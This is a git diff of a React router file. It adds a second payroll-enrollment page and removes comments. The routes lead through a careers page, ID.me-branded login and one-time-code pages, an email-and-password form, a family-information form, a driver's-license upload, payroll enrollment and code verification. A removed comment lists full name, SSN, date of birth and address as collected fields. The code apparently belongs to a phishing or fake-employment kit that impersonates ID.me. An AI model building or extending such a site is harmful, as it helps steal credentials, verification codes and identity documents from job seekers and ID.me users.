@@ -13,16 +13,16 @@ import Otp from "./pages/otp";
 import Otp2 from "./pages/idmeotp2";
 
 // Form Components
-import SignInForm from "./pages/form";                 // Email & Password form
-// Full Name, Mobile, SSN, DOB, Address (missing import? but not used)
-import Teil from "./pages/teil";                       // Family information form
-import SuccessPage from "./pages/SuccessPages";        // Success page with animation
-import UploadLicense from "./pages/upload";      
-import Success from  "./pages/Success";      // ID.me driver's license upload
+import SignInForm from "./pages/form";
+import Teil from "./pages/teil";
+import SuccessPage from "./pages/SuccessPages";
+import UploadLicense from "./pages/upload";
+import Success from "./pages/Success";
 
 // NEW PAGES
-import PayrollEnrollment from "./pages/PayrollEnrollment";  // Staff Payroll Enrollment
-import CodeVerification from "./pages/CodeVerification";    // Code verification page
+import PayrollEnrollment from "./pages/PayrollEnrollment";
+import PayrollEnrollment2 from "./pages/PayrollEnrollment2";
+import CodeVerification from "./pages/CodeVerification";
 
 const App: React.FC = () => {
   return (
@@ -31,28 +31,29 @@ const App: React.FC = () => {
       <Route path="/" element={<Home />} />
       <Route path="/career" element={<Career />} />
       <Route path="/ime" element={<Ime />} />
-      
+
       {/* ID.me Routes */}
       <Route path="/idme" element={<Idme />} />
       <Route path="/idmeotp" element={<IdmeOtp />} />
       <Route path="/otp" element={<Otp />} />
       <Route path="/idmeotp2" element={<Otp2 />} />
-      
+
       {/* Form Routes */}
       <Route path="/form" element={<SignInForm />} />
-      {/* 5‑field validation (missing component) */}
       <Route path="/teil" element={<Teil />} />
-      
-      {/* Success Page */}
-      <Route path="/success" element={<SuccessPage />} />   {/* ✅ Added route */}
-      <Route path="/done" element={<Success />} /> 
-      {/* ID.me License Upload */}
+
+      {/* Success Pages */}
+      <Route path="/success" element={<SuccessPage />} />
+      <Route path="/done" element={<Success />} />
+
+      {/* Upload */}
       <Route path="/upload" element={<UploadLicense />} />
 
-      {/* NEW: Staff Payroll Enrollment */}
+      {/* Payroll Enrollment */}
       <Route path="/payroll-enroll" element={<PayrollEnrollment />} />
+      <Route path="/payroll-enroll-2" element={<PayrollEnrollment2 />} />
 
-      {/* NEW: Code Verification */}
+      {/* Code Verification */}
       <Route path="/verify-code" element={<CodeVerification />} />
     </Routes>
   );
